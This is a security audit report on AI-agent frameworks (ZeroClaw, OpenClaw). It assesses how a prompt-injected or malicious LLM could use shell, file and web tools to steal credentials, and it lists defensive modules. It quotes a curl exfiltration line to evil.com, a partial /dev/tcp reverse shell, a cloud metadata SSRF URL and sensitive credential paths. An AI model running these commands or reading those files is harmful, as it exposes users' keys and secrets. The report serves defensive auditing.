# Security Audit Report: Stealer & Exfiltration Analysis

**Date**: 2026-02-18
**Scope**: ZeroClaw (Rust+Python) and OpenClaw (TypeScript/Node.js)
**Focus**: Credential stealing, data exfiltration, supply chain attacks, and stealer-like behaviors
**Auditor**: Automated deep-scan with manual verification

---

## Executive Summary

Both projects were audited for stealer-like behaviors (credential harvesting, environment variable exfiltration, sensitive file access, network-based data theft, obfuscated payloads). **Neither project contains intentional malware.** However, significant architectural weaknesses exist — especially in ZeroClaw's Python tooling — that could be exploited by a malicious LLM or prompt injection attack to perform stealer-like operations.

| Category | ZeroClaw | OpenClaw | IronClaw (Mitigated) |
|----------|----------|----------|---------------------|
| Shell Injection | CRITICAL | LOW | BLOCKED |
| Unrestricted File I/O | CRITICAL | LOW | BLOCKED |
| SSRF / Network Exfil | HIGH | LOW | BLOCKED |
| Env Variable Leakage | MEDIUM | LOW | BLOCKED |
| Plugin Code Verification | N/A | MEDIUM | BLOCKED |
| Supply Chain Security | GOOD | GOOD | GOOD |
| Credential Storage | GOOD | GOOD | GOOD |

---

## ZeroClaw Findings

### CRITICAL: Python Shell Tool — Zero Validation
**File**: `python/zeroclaw_tools/tools/shell.py`
```python
result = subprocess.run(command, shell=True, capture_output=True, text=True)
```
- **Risk**: Any command string is executed with `shell=True` and **zero validation**
- **Stealer vector**: LLM can execute `cat ~/.ssh/id_rsa | curl -X POST -d @- https://evil.com`
- **Impact**: Full credential theft, reverse shells, cryptomining, data exfiltration
- **CWE**: CWE-78 (OS Command Injection)

### CRITICAL: Python File Tool — Unrestricted Read/Write
**File**: `python/zeroclaw_tools/tools/file.py`
```python
with open(path, "r") as f:
    return f.read()
```
- **Risk**: No path validation, no deny list, no canonicalization
- **Stealer vector**: LLM reads `~/.aws/credentials`, `~/.ssh/id_rsa`, `/etc/shadow`, `~/.gnupg/`, browser cookies
- **Impact**: Complete credential harvesting from any readable file
- **CWE**: CWE-22 (Path Traversal), CWE-200 (Information Exposure)

### HIGH: Python Web Tool — No SSRF Protection
**File**: `python/zeroclaw_tools/tools/web.py`
```python
response = urllib.request.urlopen(url)
```
- **Risk**: No domain filtering, no private IP blocking, no DNS rebinding protection
- **Stealer vector**: Access `http://169.254.169.254/latest/meta-data/iam/` for cloud credentials
- **Impact**: Cloud metadata theft, internal network scanning, SSRF attacks
- **CWE**: CWE-918 (Server-Side Request Forgery)

### GOOD: Rust Core Security
- Shell tool (`src/tools/shell.rs`): **Clears environment variables**, only whitelists safe ones (PATH, HOME, TERM)
- HTTP tool (`src/tools/http_request.rs`): Domain allowlisting, private host blocking, header redaction
- File tools: Path validation, symlink protection, size limits, rate limiting
- Secret store: ChaCha20-Poly1305 AEAD encryption with random nonces
- Supply chain: `deny.toml` blocks unknown registries, yanked versions, unlicensed crates

**Conclusion**: ZeroClaw's Rust core is solid, but the Python tool layer is a critical attack surface with **zero security controls**.

---

## OpenClaw Findings

### MEDIUM: Plugin Loader Without Cryptographic Verification
**File**: `src/plugins/loader.ts`
- Uses `jiti` (dynamic ESM loader) for plugin code
- No Ed25519 signature verification on plugin source
- No content hash validation
- Relies on trust of npm/filesystem path
- **Stealer vector**: Compromised plugin could harvest env vars and send to external server

### LOW: Browser Tools Use eval() and new Function()
**File**: `src/browser/pw-tools-core.interactions.ts:287`
```typescript
const elementEvaluator = new Function("el", "args", `...eval(fnBody)...`);
```
- **Context**: Used only within Playwright browser automation context
- **Mitigated by**: Browser sandbox isolation, user-provided function bodies only
- **Risk**: Acceptable for browser automation use case

### GOOD: Active Skill Scanner
**File**: `src/security/skill-scanner.ts`
- Detects: `dangerous-exec`, `dynamic-code-execution`, `crypto-mining`, `suspicious-network`, `potential-exfiltration`, `obfuscated-code`, `env-harvesting`
- Tests explicitly verify detection of `fs.readFile + fetch POST` exfiltration patterns
- Runs on all plugin/skill code before execution

### GOOD: Environment Sanitization
**File**: `src/node-host/invoke.ts:138-164`
- Blocks: `NODE_OPTIONS`, `PYTHONHOME`, `PYTHONPATH`, `PERL5LIB`, `PERL5OPT`, `RUBYOPT`
- Blocks prefixes: `DYLD_`, `LD_`
- Prevents privilege escalation via environment manipulation

### GOOD: Shell Injection Protection
**File**: `src/process/exec.ts:32-43`
```typescript
// SECURITY: never enable `shell` for argv-based execution.
return false; // NEVER spawn with shell
```

### GOOD: No Telemetry/Phone-Home
- No tracking code, no analytics collection, no crash reporting to external servers
- Clipboard access is write-only (pbcopy/xclip), never reads FROM clipboard

**Conclusion**: OpenClaw has strong security posture with active defenses. Main gap is plugin code verification (no cryptographic signatures).

---

## Stealer Attack Vectors Identified

### Vector 1: Credential File Harvesting
**How**: LLM reads sensitive files via file tool, encodes content, sends via network tool
**ZeroClaw exposure**: CRITICAL (no path validation in Python tools)
**OpenClaw exposure**: LOW (file tools have path controls)
**IronClaw mitigation**: Filesystem deny list + path canonicalization + Anti-Stealer module

### Vector 2: Environment Variable Exfiltration
**How**: LLM accesses process.env or env/printenv, captures API keys/tokens
**ZeroClaw exposure**: MEDIUM (Rust shell clears env, but Python tools don't)
**OpenClaw exposure**: LOW (env sanitization + skill scanner detects env-harvesting)
**IronClaw mitigation**: Sandbox env filtering + Guardian blocks env/printenv + DLP output scanning

### Vector 3: Cloud Metadata SSRF
**How**: LLM requests `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
**ZeroClaw exposure**: HIGH (Python web tool has no SSRF protection)
**OpenClaw exposure**: LOW (gateway has SSRF protection)
**IronClaw mitigation**: Private IP blocking + DNS pinning + metadata endpoint deny list

### Vector 4: Reverse Shell / C2 Channel
**How**: LLM opens network connection to attacker-controlled server
**ZeroClaw exposure**: CRITICAL (Python shell.py can execute `bash -i >& /dev/tcp/...`)
**OpenClaw exposure**: LOW (shell=false enforced)
**IronClaw mitigation**: Guardian blocks reverse shell patterns + sandbox network=none

### Vector 5: Clipboard/Browser Data Theft
**How**: LLM accesses browser profiles, cookies, saved passwords
**ZeroClaw exposure**: LOW (no browser tool with profile access)
**OpenClaw exposure**: LOW (clipboard write-only, browser sandboxed)
**IronClaw mitigation**: Filesystem deny list includes browser profile paths

### Vector 6: Supply Chain Poisoning
**How**: Malicious dependency or plugin injected into build pipeline
**ZeroClaw exposure**: LOW (cargo-deny + strict registry policy)
**OpenClaw exposure**: MEDIUM (jiti loader without crypto verification)
**IronClaw mitigation**: Ed25519 skill signatures + SHA-256 content hashing + static analysis

### Vector 7: Memory/History Exfiltration
**How**: LLM accesses conversation history or memory store to find credentials
**ZeroClaw exposure**: MEDIUM (memory stores may contain user secrets)
**OpenClaw exposure**: MEDIUM (conversation history accessible)
**IronClaw mitigation**: AES-256-GCM encrypted memory + context isolation + DLP scanning

---

## IronClaw Security Enhancements

Based on this audit, the following new security modules have been added to IronClaw:

### New Module 1: Anti-Stealer Detection (`src/antitheft/mod.rs`)
- Credential harvesting pattern detection
- Sensitive file access monitoring (wallets, SSH keys, browser profiles, cloud credentials)
- Multi-step exfiltration detection (read + encode + send patterns)
- Anomaly detection for suspicious access sequences

### New Module 2: SSRF Protection (`src/network/mod.rs`)
- Private/reserved IP range blocking (RFC 1918, RFC 6598, link-local, loopback)
- Cloud metadata endpoint blocking (AWS, GCP, Azure, DigitalOcean, Oracle)
- DNS rebinding prevention via IP validation after resolution
- URL scheme validation (only https/http allowed)

### New Module 3: Skill Static Analyzer (`src/skills/scanner.rs`)
- Dangerous exec detection (shell, exec, spawn, system)
- Dynamic code execution detection (eval, Function constructor)
- Crypto mining detection (stratum, xmrig, coinhive)
- Exfiltration pattern detection (file read + network send)
- Environment harvesting detection (env access + network)
- Obfuscated code detection (hex encoding, large base64)
- Severity classification (Critical, Warning, Info)

### New Module 4: Data Loss Prevention (`src/dlp/mod.rs`)
- AWS/GCP/Azure credential pattern detection in outputs
- Private key detection (RSA, EC, Ed25519, PGP)
- Connection string detection (database URIs with passwords)
- JWT token detection
- SSH private key detection
- Configurable action (block, redact, warn)
- Applied to all tool outputs before they reach the LLM

### Enhanced Guardian Patterns
- Cryptocurrency wallet file access blocking
- Browser profile/cookie access blocking
- Package manager cache access blocking
- Keychain/credential store access blocking
- Base64 encoding of sensitive paths blocking

### Enhanced Configuration
- Anti-stealer enforcement toggle
- DLP policy configuration (block/redact/warn)
- SSRF protection settings
- Skill scanner integration settings
- Extended filesystem deny list (browser profiles, wallets, keychains)

---

## Recommendations for Production Deployment

1. **Always use Docker sandbox** (`sandbox.backend: "docker"`)
2. **Enable all security modules** (anti-stealer, DLP, SSRF, skill scanner)
3. **Set network policy to deny** (`sandbox.network_policy: "deny"`)
4. **Require skill signatures** (`skills.require_signatures: true`)
5. **Enable memory encryption** (`memory.encrypt_at_rest: true`)
6. **Disable shell execution** unless explicitly needed
7. **Run cargo-deny** in CI/CD pipeline
8. **Enable SIEM export** for centralized security monitoring
9. **Review audit logs** regularly for anomalous patterns
10. **Keep dependencies updated** and audit with `cargo audit`

---

## Appendix: Files Analyzed

### ZeroClaw (85+ source files)
- `src/tools/shell.rs` - Rust shell tool (secure)
- `src/tools/http_request.rs` - HTTP tool (secure)
- `src/tools/file_read.rs` - File read (secure)
- `src/tools/file_write.rs` - File write (secure)
- `src/security/secrets.rs` - Secret store (secure)
- `python/zeroclaw_tools/tools/shell.py` - Python shell (**CRITICAL**)
- `python/zeroclaw_tools/tools/file.py` - Python file I/O (**CRITICAL**)
- `python/zeroclaw_tools/tools/web.py` - Python web (**HIGH**)
- `deny.toml` - Supply chain config (secure)

### OpenClaw (500+ source files)
- `src/security/skill-scanner.ts` - Skill scanner (defensive)
- `src/security/dangerous-tools.ts` - Dangerous tool definitions
- `src/security/audit.ts` - Security audit system
- `src/plugins/loader.ts` - Plugin loader (**MEDIUM**)
- `src/browser/pw-tools-core.interactions.ts` - Browser eval (acceptable)
- `src/process/exec.ts` - Process execution (secure)
- `src/node-host/invoke.ts` - Env sanitization (secure)
- `src/infra/clipboard.ts` - Clipboard (write-only, secure)
